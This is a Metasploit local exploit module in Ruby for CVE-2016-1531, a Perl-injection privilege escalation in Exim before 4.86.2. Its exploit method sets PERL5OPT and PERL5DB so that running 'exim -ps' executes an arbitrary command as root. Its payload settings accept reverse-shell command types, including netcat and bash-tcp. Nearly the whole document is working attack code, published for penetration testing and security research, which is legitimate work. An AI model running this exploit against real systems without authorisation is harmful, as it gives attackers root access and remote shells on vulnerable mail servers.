# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Local
 
  Rank = ExcellentRanking
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Exim "perl_startup" Privilege Escalation&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a Perl injection vulnerability in Exim < 4.86.2
      },
      &#039;Author&#039;          => [
        &#039;Dawid Golunski&#039;, # Vulnerability discovery
        &#039;wvu&#039;             # Metasploit module
      ],
      &#039;References&#039;      => [
        %w{CVE 2016-1531},
        %w{EDB 39549},
        %w{URL http://www.exim.org/static/doc/CVE-2016-1531.txt}
      ],
      &#039;DisclosureDate&#039;  => &#039;Mar 10 2016&#039;,
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Platform&#039;        => &#039;unix&#039;,
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;Privileged&#039;      => true,
      &#039;Payload&#039;         => {
        &#039;BadChars&#039;      => "\x22\x27", # " and &#039;
        &#039;Compat&#039;        => {
          &#039;PayloadType&#039; => &#039;cmd cmd_bash&#039;,
          &#039;RequiredCmd&#039; => &#039;generic netcat netcat-e bash-tcp telnet&#039;
        }
      },
      &#039;Targets&#039;         => [
        [&#039;Exim < 4.86.2&#039;, {}]
      ],
      &#039;DefaultTarget&#039;   => 0
    ))
  end
 
  def check
    if exploit(&#039;whoami&#039;) == &#039;root&#039;
      CheckCode::Vulnerable
    else
      CheckCode::Safe
    end
  end
 
  def exploit(c = payload.encoded)
    # PERL5DB technique from http://perldoc.perl.org/perlrun.html
    cmd_exec(%Q{PERL5OPT=-d PERL5DB=&#039;exec "#{c}"&#039; exim -ps 2>&-})
  end
 
end

